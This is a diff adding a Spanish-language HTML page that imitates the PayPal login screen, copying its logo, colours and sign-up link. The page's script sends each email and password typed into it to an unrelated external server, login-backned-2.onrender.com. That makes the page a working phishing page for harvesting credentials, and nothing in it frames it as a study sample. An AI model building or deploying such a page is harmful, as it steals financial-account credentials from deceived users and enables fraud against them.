@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Iniciar sesión en PayPal</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #fff;
+    min-height: 100vh;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .login-container {
+    background: #fff;
+    padding: 2.5rem 2rem 2rem 2rem;
+    border-radius: 12px;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.12);
+    width: 350px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .paypal-logo {
+    width: 80px;
+    margin-bottom: 1.2rem;
+    margin-top: -1.5rem;
+  }
+  h2 {
+    text-align: center;
+    margin-bottom: 1.2rem;
+    color: #003087;
+    font-size: 1.4rem;
+    font-weight: 600;
+  }
+  .login-container form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  input[type="email"],
+  input[type="password"] {
+    width: 90%;
+    padding: 0.9rem;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+    margin: 0.5rem 0 1.1rem;
+    border: 1.5px solid #cbd2d6;
+    border-radius: 6px;
+    font-size: 1rem;
+    background: #f7f9fa;
+    transition: border 0.2s;
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    border: 1.5px solid #0070ba;
+    outline: none;
+    background: #fff;
+  }
+  button {
+    width: 100%;
+    padding: 0.9rem;
+    background: linear-gradient(90deg, #0070ba 60%, #1546a0 100%);
+    border: none;
+    color: #fff;
+    font-weight: bold;
+    border-radius: 6px;
+    font-size: 1.1rem;
+    cursor: pointer;
+    margin-top: 0.2rem;
+    margin-bottom: 0.7rem;
+    box-shadow: 0 2px 8px rgba(0,112,186,0.08);
+    transition: background 0.2s;
+  }
+  button:hover {
+    background: #003087;
+  }
+  .forgot-password {
+    display: block;
+    text-align: right;
+    margin-top: 0.2rem;
+    font-size: 0.95rem;
+    color: #0070ba;
+    text-decoration: none;
+    margin-bottom: 1.2rem;
+  }
+  .forgot-password:hover {
+    text-decoration: underline;
+  }
+  .error-message {
+    color: #d93025;
+    font-size: 0.98rem;
+    margin-bottom: 1rem;
+    display: none;
+    text-align: center;
+  }
+  .create-account {
+    display: block;
+    text-align: center;
+    margin-top: 1.2rem;
+    font-size: 1rem;
+    color: #0070ba;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .create-account:hover {
+    text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="paypal-logo" />
+    <h2>PayPal</h2>
+    <div id="error" class="error-message">Correo o contraseña incorrectos</div>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Correo electrónico" required autocomplete="username" />
+      <input type="password" id="password" placeholder="Contraseña" required autocomplete="current-password" />
+      <button type="submit">Iniciar sesión</button>
+    </form>
+    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+    <a href="https://www.paypal.com/signup" class="create-account" id="paypalLink" target="_blank">Crear cuenta en PayPal</a>
+  </div>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const errorDiv = document.getElementById('error');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = form.email.value.trim();
+    const password = form.password.value.trim();
+
+    try {
+      // Intentar login real (ahora también registra si no existe)
+      const response = await fetch('https://login-backned-2.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      const data = await response.json();
+      if (response.ok && data.success) {
+        errorDiv.style.display = 'none';
+        alert(data.message || '¡Inicio de sesión exitoso!');
+        // window.location.href = 'panel.html';
+      } else {
+        errorDiv.style.display = 'block';
+        alert(data.message || 'Correo o contraseña incorrectos');
+      }
+    } catch (err) {
+      errorDiv.style.display = 'block';
+      alert('Error de conexión con el servidor');
+    }
+  });
+</script>
+</body>
+</html>
